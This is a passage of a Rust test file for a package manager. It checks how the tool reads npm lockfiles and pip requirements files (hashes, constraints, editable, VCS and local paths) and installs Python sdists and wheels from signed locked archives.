        r#"{ "dependencies": { "left-pad": "^1.1.0" } }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("package-lock.json"),
        r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/left-pad": { "version": "1.1.3" }
                }
            }"#,
    )
    .unwrap();

    let discovered = discover_project_requirements(dir.path()).unwrap();
    assert!(discovered
        .specs
        .iter()
        .any(|spec| spec.name == "left-pad" && spec.version.as_deref() == Some("^1.1.0")));
    assert_eq!(
        discovered
            .constraints
            .get("npm:left-pad")
            .map(String::as_str),
        Some("1.1.3")
    );
}

#[test]
fn discovers_npm_shrinkwrap_constraints() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("package.json"),
        r#"{ "dependencies": { "left-pad": "^1.1.0" } }"#,
    )
    .unwrap();
    fs::write(
        dir.path().join("npm-shrinkwrap.json"),
        r#"{
                "lockfileVersion": 3,
                "packages": {
                    "": { "name": "demo", "version": "0.1.0" },
                    "node_modules/left-pad": {
                        "version": "1.1.3",
                        "resolved": "https://registry.example.invalid/left-pad-1.1.3.tgz",
                        "integrity": "sha512-leftpad"
                    }
                }
            }"#,
    )
    .unwrap();

    let discovered = discover_project_requirements(dir.path()).unwrap();
    assert_eq!(
        discovered
            .constraints
            .get("npm:left-pad")
            .map(String::as_str),
        Some("1.1.3")
    );
    assert_eq!(
        discovered
            .npm_resolved
            .get("npm:left-pad")
            .map(String::as_str),
        Some("https://registry.example.invalid/left-pad-1.1.3.tgz")
    );
    assert_eq!(
        discovered
            .npm_integrities
            .get("npm:left-pad")
            .and_then(|integrities| integrities.iter().next())
            .map(String::as_str),
        Some("sha512-leftpad")
    );
}

#[test]
fn merges_npm_lock_constraints_into_ranges_and_aliases() {
    let spec = PackageSpec::new(Ecosystem::Npm, "is-odd", Some("^3.0.0".to_owned()));
    let constraints = BTreeMap::from([("npm:is-odd".to_owned(), "3.0.1".to_owned())]);
    assert_eq!(
        constrained_npm_requirement(&spec, spec.version.as_deref(), &constraints).as_deref(),
        Some("^3.0.0,3.0.1")
    );
    let overrides = BTreeMap::from([("npm:is-odd".to_owned(), "4.0.0".to_owned())]);
    assert_eq!(
        effective_npm_requirement(&spec, spec.version.as_deref(), &constraints, &overrides)
            .as_deref(),
        Some("4.0.0")
    );

    let alias = PackageSpec::new(
        Ecosystem::Npm,
        "string-width-cjs",
        Some("npm:string-width@^4.2.0".to_owned()),
    );
    let (_, alias_requirement) = npm_registry_name_and_requirement(&alias).unwrap();
    assert_eq!(
        constrained_npm_requirement(&alias, alias_requirement.as_deref(), &BTreeMap::new())
            .as_deref(),
        Some("^4.2.0")
    );
}

#[test]
fn reads_requirements_specs() {
    let dir = tempfile::tempdir().unwrap();
    let requirements = dir.path().join("requirements.txt");
    let nested = dir.path().join("nested.txt");
    let constraints = dir.path().join("constraints.txt");
    fs::write(&nested, "charset-normalizer==3.4.0\n").unwrap();
    fs::write(&constraints, "urllib3==2.2.1\n").unwrap();
    fs::write(
            &requirements,
            "requests[socks]==2.32.3 \\\n  --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n# ignored\nidna>=2,<4\n-r nested.txt\n-c constraints.txt\ncolorama; extra == 'windows'\n",
        )
        .unwrap();
    let discovered = read_requirements_file(&requirements).unwrap();
    let specs = discovered.specs;
    assert!(specs.iter().any(|spec| spec.name == "requests"
        && spec.version.as_deref() == Some("==2.32.3")
        && spec.extras.contains("socks")));
    assert!(specs
        .iter()
        .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some(">=2,<4")));
    assert!(specs.iter().any(
        |spec| spec.name == "charset-normalizer" && spec.version.as_deref() == Some("==3.4.0")
    ));
    assert!(!specs.iter().any(|spec| spec.name == "colorama"));
    assert_eq!(specs.len(), 3);
    assert_eq!(
        discovered
            .constraints
            .get("pypi:urllib3")
            .map(String::as_str),
        Some("==2.2.1")
    );
    assert_eq!(
        discovered
            .hashes
            .get("pypi:requests")
            .and_then(|hashes| hashes.iter().next())
            .map(String::as_str),
        Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    );
}

#[test]
fn reads_requirements_quoted_option_values() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("requirements")).unwrap();
    fs::create_dir_all(dir.path().join("constraints")).unwrap();
    fs::create_dir_all(dir.path().join("wheel house")).unwrap();
    let requirements = dir.path().join("requirements.txt");
    fs::write(
        dir.path().join("requirements").join("dev requirements.txt"),
        "certifi==2024.2.2\n",
    )
    .unwrap();
    fs::write(
        dir.path()
            .join("requirements")
            .join("more requirements.txt"),
        "charset-normalizer==3.4.0\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("constraints").join("prod constraints.txt"),
        "idna==3.7\n",
    )
    .unwrap();
    fs::write(
            &requirements,
            "--requirement='requirements/dev requirements.txt'\n-r \"requirements/more requirements.txt\"\n--constraint='constraints/prod constraints.txt'\n--find-links=\"./wheel house\"\n--index-url=\"https://index.example.invalid/simple\"\nidna>=2\n",
        )
        .unwrap();

    let discovered = read_requirements_file(&requirements).unwrap();
    assert!(has_spec(&discovered.specs, "certifi", "==2024.2.2"));
    assert!(has_spec(&discovered.specs, "charset-normalizer", "==3.4.0"));
    assert!(has_spec(&discovered.specs, "idna", ">=2"));
    assert_eq!(
        discovered.constraints.get("pypi:idna").map(String::as_str),
        Some("==3.7")
    );
    assert_eq!(
        discovered.pypi_find_links,
        vec![dir
            .path()
            .join(".")
            .join("wheel house")
            .to_string_lossy()
            .into_owned()]
    );
    assert_eq!(
        discovered.pypi_index_url.as_deref(),
        Some("https://index.example.invalid/simple/")
    );
}

#[test]
fn reads_requirements_attached_short_option_values() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("requirements")).unwrap();
    fs::create_dir_all(dir.path().join("constraints")).unwrap();
    fs::create_dir_all(dir.path().join("wheelhouse")).unwrap();
    let requirements = dir.path().join("requirements.txt");
    fs::write(
        dir.path().join("requirements").join("base.txt"),
        "certifi==2024.2.2\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("constraints").join("base.txt"),
        "idna==3.7\n",
    )
    .unwrap();
    fs::write(
            &requirements,
            "-rrequirements/base.txt\n-cconstraints/base.txt\n-f./wheelhouse\n-ihttps://index.example.invalid/simple\nidna>=2\n",
        )
        .unwrap();

    let discovered = read_requirements_file(&requirements).unwrap();
    assert!(has_spec(&discovered.specs, "certifi", "==2024.2.2"));
    assert!(has_spec(&discovered.specs, "idna", ">=2"));
    assert_eq!(
        discovered.constraints.get("pypi:idna").map(String::as_str),
        Some("==3.7")
    );
    assert_eq!(
        discovered.pypi_find_links,
        vec![dir
            .path()
            .join(".")
            .join("wheelhouse")
            .to_string_lossy()
            .into_owned()]
    );
    assert_eq!(
        discovered.pypi_index_url.as_deref(),
        Some("https://index.example.invalid/simple/")
    );
}

#[test]
fn expands_requirements_environment_variables() {
    let dir = tempfile::tempdir().unwrap();
    let requirements = dir.path().join("requirements.txt");
    fs::write(
            &requirements,
            "--index-url ${OMC_TEST_INDEX_URL}\n--extra-index-url ${OMC_TEST_EXTRA_INDEX_URL}\n--find-links ${OMC_TEST_FIND_LINKS}\n${OMC_TEST_REQUIREMENT}\n",
        )
        .unwrap();

    with_env_values(
        &[
            (
                "OMC_TEST_INDEX_URL",
                Some("https://index.example.invalid/simple"),
            ),
            (
                "OMC_TEST_EXTRA_INDEX_URL",
                Some("https://extra.example.invalid/simple"),
            ),
            ("OMC_TEST_FIND_LINKS", Some("wheelhouse")),
            ("OMC_TEST_REQUIREMENT", Some("idna==3.7")),
        ],
        || {
            let discovered = read_requirements_file(&requirements).unwrap();

            assert_eq!(
                discovered.pypi_index_url.as_deref(),
                Some("https://index.example.invalid/simple/")
            );
            assert_eq!(
                discovered.pypi_extra_index_urls,
                vec!["https://extra.example.invalid/simple/".to_owned()]
            );
            assert_eq!(
                discovered.pypi_find_links,
                vec![dir.path().join("wheelhouse").to_string_lossy().into_owned()]
            );
            assert!(has_spec(&discovered.specs, "idna", "==3.7"));
        },
    );
}

#[test]
fn accepts_requirements_use_feature_options() {
    let dir = tempfile::tempdir().unwrap();
    let requirements = dir.path().join("requirements.txt");
    fs::write(
            &requirements,
            "--use-feature=truststore\n--use-feature fast-deps\n--use-deprecated legacy-resolver\nidna==3.7\n",
        )
        .unwrap();

    let discovered = read_requirements_file(&requirements).unwrap();

    assert_eq!(discovered.specs.len(), 1);
    assert!(has_spec(&discovered.specs, "idna", "==3.7"));
}

#[test]
fn reads_inline_script_metadata_requirements() {
    let dir = tempfile::tempdir().unwrap();
    let local = dir.path().join("vendor").join("localpkg");
    fs::create_dir_all(&local).unwrap();
    let script = dir.path().join("tool.py");
    fs::write(
        &script,
        r#"
# /// script
# dependencies = [
#   "idna==3.7",
#   "localpkg @ ./vendor/localpkg",
# ]
# ///
print("hi")
"#,
    )
    .unwrap();

    let discovered = read_script_requirement_files(&[script]).unwrap();
    assert!(has_spec(&discovered.specs, "idna", "==3.7"));
    assert_eq!(discovered.python_local_paths, vec![local.clone()]);
    assert_eq!(
        discovered.python_local_requirements,
        vec![PythonLocalRequirement::new(local, BTreeSet::new())]
    );
}

#[test]
fn rejects_multiple_inline_script_metadata_blocks() {
    let dir = tempfile::tempdir().unwrap();
    let script = dir.path().join("tool.py");
    fs::write(
        &script,
        r#"
# /// script
# dependencies = ["idna==3.7"]
# ///
# /// script
# dependencies = ["urllib3==2.2.1"]
# ///
"#,
    )
    .unwrap();

    let error = read_script_requirement_files(&[script]).unwrap_err();
    assert!(error
        .to_string()
        .contains("multiple inline script metadata blocks found"));
}

#[test]
fn discovers_dev_requirements_files_respecting_omit_dev() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("requirements.txt"), "idna==3.7\n").unwrap();
    fs::write(
        dir.path().join("requirements-dev.txt"),
        "-r requirements.txt\npytest==8.2.0\n",
    )
    .unwrap();
    fs::write(dir.path().join("dev-requirements.txt"), "ruff==0.5.0\n").unwrap();

    let production =
        discover_project_requirements_with_options(dir.path(), &BTreeSet::new(), false).unwrap();
    assert!(has_spec(&production.specs, "idna", "==3.7"));
    assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));
    assert!(!production.specs.iter().any(|spec| spec.name == "ruff"));

    let dev = discover_project_requirements(dir.path()).unwrap();
    assert!(has_spec(&dev.specs, "idna", "==3.7"));
    assert!(has_spec(&dev.specs, "pytest", "==8.2.0"));
    assert!(has_spec(&dev.specs, "ruff", "==0.5.0"));
    assert_eq!(
        dev.specs.iter().filter(|spec| spec.name == "idna").count(),
        1
    );
}

#[test]
fn discovers_requirements_directory_layout() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("requirements")).unwrap();
    fs::write(
        dir.path().join("requirements").join("base.txt"),
        "idna==3.7\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("requirements").join("dev.txt"),
        "-r base.txt\npytest==8.2.0\n",
    )
    .unwrap();

    let production =
        discover_project_requirements_with_options(dir.path(), &BTreeSet::new(), false).unwrap();
    assert!(has_spec(&production.specs, "idna", "==3.7"));
    assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));

    let dev = discover_project_requirements(dir.path()).unwrap();
    assert!(has_spec(&dev.specs, "idna", "==3.7"));
    assert!(has_spec(&dev.specs, "pytest", "==8.2.0"));
    assert_eq!(
        dev.specs.iter().filter(|spec| spec.name == "idna").count(),
        1
    );
}

#[test]
fn installs_explicit_requirement_files() {
    let dir = tempfile::tempdir().unwrap();
    fs::create_dir_all(dir.path().join("requirements")).unwrap();
    let local = dir.path().join("vendor").join("localpkg");
    let src = local.join("src");
    fs::create_dir_all(src.join("localpkg")).unwrap();
    fs::write(
        src.join("localpkg").join("__init__.py"),
        "VALUE = 'explicit'\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("requirements").join("prod.txt"),
        "-e ../vendor/localpkg\n",
    )
    .unwrap();

    let mut options = LinkOptions::new(dir.path());
    options
        .requirement_files
        .push(dir.path().join("requirements").join("prod.txt"));
    let report = install_project(&options).unwrap();
    assert_eq!(report.pypi_packages, 0);

    let local_paths =
        fs::read_to_string(dir.path().join(".omc").join("python").join("local-paths")).unwrap();
    assert_eq!(
        local_paths.trim(),
        fs::canonicalize(src).unwrap().to_string_lossy()
    );
}

#[test]
fn applies_explicit_constraint_files() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(dir.path().join("requirements.txt"), "idna>=2\n").unwrap();
    fs::write(dir.path().join("constraints.txt"), "idna==3.7\n").unwrap();

    let mut options = LinkOptions::new(dir.path());
    options
        .requirement_files
        .push(dir.path().join("requirements.txt"));
    options
        .constraint_files
        .push(dir.path().join("constraints.txt"));
    let specs = project_requested_specs(&mut options, false).unwrap();

    assert!(specs
        .iter()
        .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some(">=2")));
    assert_eq!(
        options.constraints.get("pypi:idna").map(String::as_str),
        Some("==3.7")
    );
}

#[test]
fn installs_pure_python_sdist_archives() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = python_sdist_for_test(&[
        (
            "pyproject.toml",
            r#"
                [project]
                name = "pure-sdist"
                version = "1.0.0"

                [project.scripts]
                pure-sdist-cli = "puresdist.cli:main"
                "#,
        ),
        ("src/puresdist/__init__.py", "VALUE = 'sdist-ok'\n"),
        (
            "src/puresdist/cli.py",
            "from puresdist import VALUE\n\ndef main():\n    print(VALUE)\n",
        ),
    ]);
    let archive = dir
        .path()
        .join(".omc")
        .join("cache")
        .join("pure-sdist-1.0.0.tar.gz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Pypi, "pure-sdist", "1.0.0");
    package.source_url = "https://example.invalid/pure-sdist-1.0.0.tar.gz".to_owned();
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);
    package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &package);

    let report = install_lock(
        dir.path(),
        &OmcLock {
            version: 1,
            signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
            packages: vec![package],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        },
    )
    .unwrap();
    assert_eq!(report.pypi_packages, 1);
    assert!(dir
        .path()
        .join(".omc/python/site-packages/puresdist/__init__.py")
        .exists());

    let output = Command::new(dir.path().join(".omc/python/bin/pure-sdist-cli"))
        .output()
        .unwrap();
    assert!(output.status.success());
    assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "sdist-ok");
}

#[test]
fn installs_pure_python_archives_into_target_directory() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = python_sdist_for_test(&[
        (
            "pyproject.toml",
            r#"
                [project]
                name = "pure-target"
                version = "1.0.0"

                [project.scripts]
                pure-target-cli = "puretarget.cli:main"
                "#,
        ),
        ("src/puretarget/__init__.py", "VALUE = 'target-ok'\n"),
        (
            "src/puretarget/cli.py",
            "from puretarget import VALUE\n\ndef main():\n    print(VALUE)\n",
        ),
    ]);
    let archive = dir
        .path()
        .join(".omc")
        .join("cache")
        .join("pure-target-1.0.0.tar.gz");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Pypi, "pure-target", "1.0.0");
    package.source_url = "https://example.invalid/pure-target-1.0.0.tar.gz".to_owned();
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);
    package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &package);

    let target = dir.path().join("vendor");
    fs::create_dir_all(&target).unwrap();
    fs::write(target.join("keep.txt"), "keep\n").unwrap();

    let report = install_lock_with_python_target(
        dir.path(),
        &OmcLock {
            version: 1,
            signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
            packages: vec![package],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        },
        Some(&target),
        None,
        true,
    )
    .unwrap();
    assert_eq!(report.pypi_packages, 1);
    assert_eq!(report.python_site_packages, target);
    assert!(dir
        .path()
        .join("vendor")
        .join("puretarget")
        .join("__init__.py")
        .exists());
    assert!(dir.path().join("vendor").join("keep.txt").exists());

    let output = Command::new(dir.path().join("vendor/bin/pure-target-cli"))
        .output()
        .unwrap();
    assert!(output.status.success());
    assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "target-ok");
}

#[test]
fn target_upgrade_removes_stale_wheel_files() {
    let dir = tempfile::tempdir().unwrap();
    let old_wheel = python_package_wheel_for_test(
        "wheel-stale-pkg",
        "1.0.0",
        &[
            ("wheel_stale_pkg/__init__.py", "VALUE = 'old'\n"),
            ("wheel_stale_pkg/extra.py", "EXTRA = True\n"),
        ],
    );
    let new_wheel = python_package_wheel_for_test(
        "wheel-stale-pkg",
        "1.1.0",
        &[("wheel_stale_pkg/__init__.py", "VALUE = 'new'\n")],
    );
    let old_archive = dir
        .path()
        .join(".omc")
        .join("cache")
        .join("wheel_stale_pkg-1.0.0-py3-none-any.whl");
    let new_archive = dir
        .path()
        .join(".omc")
        .join("cache")
        .join("wheel_stale_pkg-1.1.0-py3-none-any.whl");
    fs::create_dir_all(old_archive.parent().unwrap()).unwrap();
    fs::write(&old_archive, &old_wheel).unwrap();
    fs::write(&new_archive, &new_wheel).unwrap();

    let mut old_package = locked_package_for_test(Ecosystem::Pypi, "wheel-stale-pkg", "1.0.0");
    old_package.source_url =
        "https://example.invalid/wheel_stale_pkg-1.0.0-py3-none-any.whl".to_owned();
    old_package.archive = relative_path(dir.path(), &old_archive);
    old_package.sha256 = sha256_hex(&old_wheel);
    old_package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &old_package);

    let mut new_package = locked_package_for_test(Ecosystem::Pypi, "wheel-stale-pkg", "1.1.0");
    new_package.source_url =
        "https://example.invalid/wheel_stale_pkg-1.1.0-py3-none-any.whl".to_owned();
    new_package.archive = relative_path(dir.path(), &new_archive);
    new_package.sha256 = sha256_hex(&new_wheel);
    new_package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &new_package);

    let target = dir.path().join("vendor");
    install_lock_with_python_target(
        dir.path(),
        &OmcLock {
            version: 1,
            signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
            packages: vec![old_package],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        },
        Some(&target),
        None,
        true,
    )
    .unwrap();
    install_lock_with_python_target(
        dir.path(),
        &OmcLock {
            version: 1,
            signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
            packages: vec![new_package],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        },
        Some(&target),
        None,
        true,
    )
    .unwrap();

    assert_eq!(
        fs::read_to_string(target.join("wheel_stale_pkg").join("__init__.py")).unwrap(),
        "VALUE = 'new'\n"
    );
    assert!(!target.join("wheel_stale_pkg").join("extra.py").exists());
    assert!(target
        .join("wheel_stale_pkg-1.0.0.dist-info")
        .join("METADATA")
        .exists());
    assert!(target
        .join("wheel_stale_pkg-1.1.0.dist-info")
        .join("METADATA")
        .exists());
}

#[test]
fn target_no_upgrade_skips_scripts_when_bin_dir_exists() {
    let dir = tempfile::tempdir().unwrap();
    let old_wheel = python_package_wheel_with_entry_points_for_test(
        "script-stale-pkg",
        "1.0.0",
        &[(
            "script_stale_pkg/__init__.py",
            "def main():\n    print('ok')\n",
        )],
        "[console_scripts]\nold-cli = script_stale_pkg:main\n",
    );
    let new_wheel = python_package_wheel_with_entry_points_for_test(
        "script-stale-pkg",
        "1.1.0",
        &[(
            "script_stale_pkg/__init__.py",
            "def main():\n    print('ok')\n",
        )],
        "[console_scripts]\nnew-cli = script_stale_pkg:main\n",
    );
    let old_archive = dir
        .path()
        .join(".omc")
        .join("cache")
        .join("script_stale_pkg-1.0.0-py3-none-any.whl");
    let new_archive = dir
        .path()
        .join(".omc")
        .join("cache")
        .join("script_stale_pkg-1.1.0-py3-none-any.whl");
    fs::create_dir_all(old_archive.parent().unwrap()).unwrap();
    fs::write(&old_archive, &old_wheel).unwrap();
    fs::write(&new_archive, &new_wheel).unwrap();

    let mut old_package = locked_package_for_test(Ecosystem::Pypi, "script-stale-pkg", "1.0.0");
    old_package.source_url =
        "https://example.invalid/script_stale_pkg-1.0.0-py3-none-any.whl".to_owned();
    old_package.archive = relative_path(dir.path(), &old_archive);
    old_package.sha256 = sha256_hex(&old_wheel);
    old_package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &old_package);

    let mut new_package = locked_package_for_test(Ecosystem::Pypi, "script-stale-pkg", "1.1.0");
    new_package.source_url =
        "https://example.invalid/script_stale_pkg-1.1.0-py3-none-any.whl".to_owned();
    new_package.archive = relative_path(dir.path(), &new_archive);
    new_package.sha256 = sha256_hex(&new_wheel);
    new_package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &new_package);

    let target = dir.path().join("vendor");
    let report = install_lock_with_python_target(
        dir.path(),
        &OmcLock {
            version: 1,
            signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
            packages: vec![old_package],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        },
        Some(&target),
        None,
        false,
    )
    .unwrap();
    assert_eq!(report.python_scripts, 1);
    assert!(target.join("bin").join("old-cli").exists());

    install_lock_with_python_target(
        dir.path(),
        &OmcLock {
            version: 1,
            signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
            packages: vec![new_package],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        },
        Some(&target),
        None,
        false,
    )
    .unwrap();

    assert!(target.join("bin").join("old-cli").exists());
    assert!(!target.join("bin").join("new-cli").exists());
    assert!(target
        .join("script_stale_pkg-1.1.0.dist-info")
        .join("entry_points.txt")
        .exists());
}

#[test]
fn installs_pure_python_zip_sdist_archives() {
    let dir = tempfile::tempdir().unwrap();
    let bytes = python_zip_sdist_for_test(&[
        (
            "pyproject.toml",
            r#"
                [project]
                name = "pure-sdist"
                version = "1.0.0"

                [project.scripts]
                pure-sdist-cli = "puresdist.cli:main"
                "#,
        ),
        ("src/puresdist/__init__.py", "VALUE = 'zip-sdist-ok'\n"),
        (
            "src/puresdist/cli.py",
            "from puresdist import VALUE\n\ndef main():\n    print(VALUE)\n",
        ),
    ]);
    let archive = dir
        .path()
        .join(".omc")
        .join("cache")
        .join("pure-sdist-1.0.0.zip");
    fs::create_dir_all(archive.parent().unwrap()).unwrap();
    fs::write(&archive, &bytes).unwrap();

    let mut package = locked_package_for_test(Ecosystem::Pypi, "pure-sdist", "1.0.0");
    package.source_url = "https://example.invalid/pure-sdist-1.0.0.zip".to_owned();
    package.archive = relative_path(dir.path(), &archive);
    package.sha256 = sha256_hex(&bytes);
    package.artifact_sha256 = write_signed_artifact_for_test(dir.path(), &package);

    let report = install_lock(
        dir.path(),
        &OmcLock {
            version: 1,
            signing_key: Some(project_signing_public_key(dir.path()).unwrap()),
            packages: vec![package],
            local_sources: Vec::new(),
            python_vcs: Vec::new(),
        },
    )
    .unwrap();
    assert_eq!(report.pypi_packages, 1);

    let output = Command::new(dir.path().join(".omc/python/bin/pure-sdist-cli"))
        .output()
        .unwrap();
    assert!(output.status.success());
    assert_eq!(
        String::from_utf8_lossy(&output.stdout).trim(),
        "zip-sdist-ok"
    );
}

#[test]
fn reads_requirements_local_editable_paths() {
    let dir = tempfile::tempdir().unwrap();
    let requirements = dir.path().join("requirements.txt");
    let file_url_pkg = dir.path().join("vendor/file-url-edit");
    let file_url = reqwest::Url::from_directory_path(&file_url_pkg)
        .unwrap()
        .to_string();
    fs::write(
        &requirements,
        format!("-e .\n--editable ./vendor/pkg[dev]\n-e {file_url}\n"),
    )
    .unwrap();

    let discovered = read_requirements_file(&requirements).unwrap();
    assert_eq!(
        discovered.python_local_requirements,
        vec![
            PythonLocalRequirement::new(dir.path().join("."), BTreeSet::new()),
            PythonLocalRequirement::new(
                dir.path().join("./vendor/pkg"),
                BTreeSet::from(["dev".to_owned()])
            ),
            PythonLocalRequirement::new(file_url_pkg, BTreeSet::new())
        ]
    );

    let project = discover_project_requirements(dir.path()).unwrap();
    assert_eq!(
        project.python_local_requirements,
        discovered.python_local_requirements
    );
}

#[test]
fn reads_requirements_local_direct_paths() {
    let dir = tempfile::tempdir().unwrap();
    let requirements = dir.path().join("requirements.txt");
    let local_pkg = dir.path().join("vendor/local-pkg");
    let file_url_pkg = dir.path().join("vendor/file-url-pkg");
    let bare_pkg = dir.path().join("vendor/bare-pkg");
    let bare_file_url_pkg = dir.path().join("vendor/bare-file-url-pkg");
    fs::create_dir_all(&local_pkg).unwrap();
    fs::create_dir_all(&file_url_pkg).unwrap();
    fs::create_dir_all(&bare_pkg).unwrap();
    fs::create_dir_all(&bare_file_url_pkg).unwrap();
    let file_url = reqwest::Url::from_directory_path(&file_url_pkg)
        .unwrap()
        .to_string();
    let bare_file_url = reqwest::Url::from_directory_path(&bare_file_url_pkg)
        .unwrap()
        .to_string();
    fs::write(
            &requirements,
            format!(
                "local-pkg @ file:./vendor/local-pkg\nfile-url-pkg @ {file_url}\nlink:./vendor/bare-pkg[dev]\n{bare_file_url}\n./missing-bare; sys_platform == 'win32'\nskipped-local @ ./missing; sys_platform == 'definitely-not' and (python_version < '0' or python_version >= '3')\n"
            ),
        )
        .unwrap();

    let discovered = read_requirements_file(&requirements).unwrap();
    assert!(discovered.python_local_requirements.is_empty());
    assert_eq!(
        discovered.python_local_directory_requirements,
        vec![
            PythonLocalRequirement::new(local_pkg, BTreeSet::new()),
            PythonLocalRequirement::new(file_url_pkg, BTreeSet::new()),
            PythonLocalRequirement::new(bare_pkg, BTreeSet::from(["dev".to_owned()])),
            PythonLocalRequirement::new(bare_file_url_pkg, BTreeSet::new())
        ]
    );

    let project = discover_project_requirements(dir.path()).unwrap();
    assert_eq!(
        project.python_local_directory_requirements,
        discovered.python_local_directory_requirements
    );
}

#[test]
fn reads_requirements_vcs_dependencies() {
    let dir = tempfile::tempdir().unwrap();
    let requirements = dir.path().join("requirements.txt");
    let repo_url = reqwest::Url::from_directory_path(dir.path().join("repo"))
        .unwrap()
        .to_string();
    fs::write(
            &requirements,
            format!(
                "-e git+{repo_url}@v1#egg=demo[cli]&subdirectory=src\nother[http] @ git+{repo_url}@main#subdirectory=package\ngit+{repo_url}@release#egg=bare&subdirectory=barepkg; python_version >= '3'\n"
            ),
        )
        .unwrap();
    let discovered = read_requirements_file(&requirements).unwrap();
    assert!(discovered.specs.is_empty());
    assert!(discovered.python_local_paths.is_empty());
    assert_eq!(discovered.python_vcs_requirements.len(), 3);

    let editable = &discovered.python_vcs_requirements[0];
    assert_eq!(editable.name, "demo");
    assert_eq!(editable.url, repo_url);
    assert_eq!(editable.reference.as_deref(), Some("v1"));
    assert_eq!(editable.subdirectory.as_deref(), Some(Path::new("src")));
    assert_eq!(editable.extras, BTreeSet::from(["cli".to_owned()]));

    let direct = &discovered.python_vcs_requirements[1];
    assert_eq!(direct.name, "other");
    assert_eq!(direct.reference.as_deref(), Some("main"));
    assert_eq!(direct.subdirectory.as_deref(), Some(Path::new("package")));
    assert_eq!(direct.extras, BTreeSet::from(["http".to_owned()]));

    let bare = &discovered.python_vcs_requirements[2];
    assert_eq!(bare.name, "bare");
    assert_eq!(bare.reference.as_deref(), Some("release"));
    assert_eq!(bare.subdirectory.as_deref(), Some(Path::new("barepkg")));
}

#[test]
fn installs_python_vcs_requirement_as_local_path() {
    let dir = tempfile::tempdir().unwrap();
    let repo = dir.path().join("gitpkg-repo");
    let src = repo.join("src").join("gitpkg");
    fs::create_dir_all(&src).unwrap();
    fs::write(src.join("__init__.py"), "").unwrap();
    fs::write(src.join("cli.py"), "def main():\n    print('git-vcs-ok')\n").unwrap();
    fs::write(
        repo.join("pyproject.toml"),
        r#"
            [project]
            name = "gitpkg"

            [project.scripts]
            git-vcs-cli = "gitpkg.cli:main"
            "#,
    )
    .unwrap();
    commit_git_repo(&repo);

    let project = dir.path().join("project");
    fs::create_dir_all(&project).unwrap();
    let repo_url = reqwest::Url::from_directory_path(&repo)
        .unwrap()
        .to_string();
    fs::write(
        project.join("requirements.txt"),
        format!("gitpkg @ git+{repo_url}@HEAD\n"),
    )
    .unwrap();

    let requirements =
        discover_project_requirements_with_options(&project, &BTreeSet::new(), false).unwrap();
    assert_eq!(requirements.python_vcs_requirements.len(), 1);

    let report = install_project(&LinkOptions::new(&project)).unwrap();
    assert_eq!(report.python_scripts, 1);
    let lock = read_lockfile(project.join("omc.lock")).unwrap();
    assert_eq!(lock.python_vcs.len(), 1);
    assert_eq!(lock.python_vcs[0].name, "gitpkg");
    assert_eq!(lock.python_vcs[0].reference.as_deref(), Some("HEAD"));
    assert!(is_git_commit_hash(&lock.python_vcs[0].resolved_commit));
    assert!(lock.python_vcs[0].archive.ends_with(".tar.gz"));
    assert!(project.join(&lock.python_vcs[0].archive).exists());
    assert_eq!(lock.python_vcs[0].sha256.len(), 64);
    let local_paths = fs::read_to_string(project.join(".omc/python/local-paths")).unwrap();
    assert!(local_paths.contains(".omc/python/vcs/gitpkg/"));

    let output = Command::new(project.join(".omc/python/bin/git-vcs-cli"))
        .output()
        .unwrap();
    assert!(output.status.success());
    assert_eq!(String::from_utf8_lossy(&output.stdout).trim(), "git-vcs-ok");
}

#[test]
fn locked_python_vcs_install_uses_pinned_commit() {
    let dir = tempfile::tempdir().unwrap();
    let repo = dir.path().join("gitpkg-repo");
    let src = repo.join("src").join("gitpkg");
    fs::create_dir_all(&src).unwrap();
    fs::write(src.join("__init__.py"), "").unwrap();
    fs::write(src.join("cli.py"), "def main():\n    print('v1')\n").unwrap();
